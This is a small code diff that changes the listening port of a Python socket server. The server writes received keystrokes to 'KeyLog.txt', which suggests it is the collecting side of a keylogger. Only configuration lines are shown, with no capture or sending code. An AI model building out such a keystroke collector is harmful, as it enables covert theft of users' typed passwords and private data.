@@ -2,7 +2,7 @@ import socket
 
 # Server IP and Port
 SERVER_IP = '0.0.0.0'  # Listen on all interfaces
-SERVER_PORT = 9999
+SERVER_PORT = 5555
 
 # Create a log file for keystrokes
 log_file = 'KeyLog.txt'
